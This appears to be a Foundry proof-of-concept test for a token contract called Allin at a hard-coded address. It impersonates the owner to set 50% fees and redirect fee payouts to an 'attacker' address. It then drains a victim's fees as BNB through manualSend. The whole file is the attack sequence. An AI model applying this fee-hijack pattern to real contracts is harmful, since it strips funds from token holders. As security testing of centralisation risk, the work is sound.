// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IAllin {
    function getOwner() external view returns (address);
    function tradingStatus(bool _status) external;
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingdevelopmentFee, uint256 _feeDenominator) external;
    function setFeeReceivers(address _developmentReceiver, address _marketingFeeReceiver) external;
    function setIsFeeExempt(address holder, bool exempt) external;
    function setIsTxLimitExempt(address holder, bool exempt) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function manualSend() external;
    function swapThreshold() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x05cd34a1D5dF5010F5eDb3412077B3c291DDb7a8;
    address attacker = address(this);
    IAllin target;
    address owner;
    address victim = address(0x999);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get the contract instance and prepare attacker
        target = IAllin(TARGET);
        attacker = address(this);

        // Get the current owner from the contract
        owner = target.getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "Allin Token");
        vm.label(attacker, "Attacker");

        // Impersonate the owner for all privileged operations
        vm.startPrank(owner);

        // Enable trading if not already enabled
        target.tradingStatus(true);

        // Set fees to extremely high value (50%)
        // Parameters: liquidityFee, buybackFee, reflectionFee, marketingdevelopmentFee, feeDenominator
        target.setFees(1000, 1000, 1000, 2000, 10000); // Total = 5000/10000 = 50%

        // Set marketingFeeReceiver to attacker address so we receive the drained BNB
        target.setFeeReceivers(address(0xdead), attacker);

        // Also make attacker exempt from fees and tx limits to avoid paying fees ourselves
        target.setIsFeeExempt(attacker, true);
        target.setIsTxLimitExempt(attacker, true);

        vm.stopPrank();

        // Get some initial tokens from the initial holder (0x4CE6D95Ba0f6CBEa8CdC43E1a77359E609bC730C)
        address initialHolder = 0x4CE6D95Ba0f6CBEa8CdC43E1a77359E609bC730C;
        vm.label(initialHolder, "Initial Holder");

        // Impersonate initial holder to transfer tokens to attacker
        vm.prank(initialHolder);
        target.transfer(attacker, 1000000 * 10**18); // Transfer 1M tokens

        // Also create a victim address that will pay fees
        vm.label(victim, "Victim");

        // Transfer some tokens to victim
        vm.prank(initialHolder);
        target.transfer(victim, 1000000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance of attacker
        uint256 initialBalance = address(attacker).balance;

        // Step 1: Perform token transfers to generate fees
        // Victim transfers tokens (will pay 50% fee)
        uint256 victimBalance = target.balanceOf(victim);
        vm.prank(victim);
        target.transfer(address(0x888), victimBalance / 2);

        // Step 2: Trigger swapBack if needed to convert tokens to BNB
        // We need to ensure contract has enough tokens to reach swapThreshold
        // Let's check contract balance and trigger swap if possible
        uint256 contractTokenBalance = target.balanceOf(TARGET);

        // If contract has tokens, we can trigger swapBack by calling transfer
        // The swapBack is triggered in shouldSwapBack() during transfers
        // So we need to make a transfer that triggers swapBack
        if (contractTokenBalance > 0) {
            // Create a dummy address to receive tokens
            address dummy = address(0x777);

            // Impersonate owner to make attacker exempt from fees
            vm.startPrank(owner);
            target.setIsFeeExempt(attacker, true);
            vm.stopPrank();

            // Attacker transfers tokens to trigger swapBack
            // Since attacker is fee exempt, no fees are taken
            uint256 attackerBalance = target.balanceOf(attacker);
            if (attackerBalance > 0) {
                target.transfer(dummy, attackerBalance / 10);
            }
        }

        // Step 3: Drain accumulated BNB using manualSend()
        // Impersonate owner to call manualSend
        vm.prank(owner);
        target.manualSend();

        // Step 4: Verify attacker received BNB
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have more BNB after exploit");

        console.log("Initial attacker BNB balance:", initialBalance);
        console.log("Final attacker BNB balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
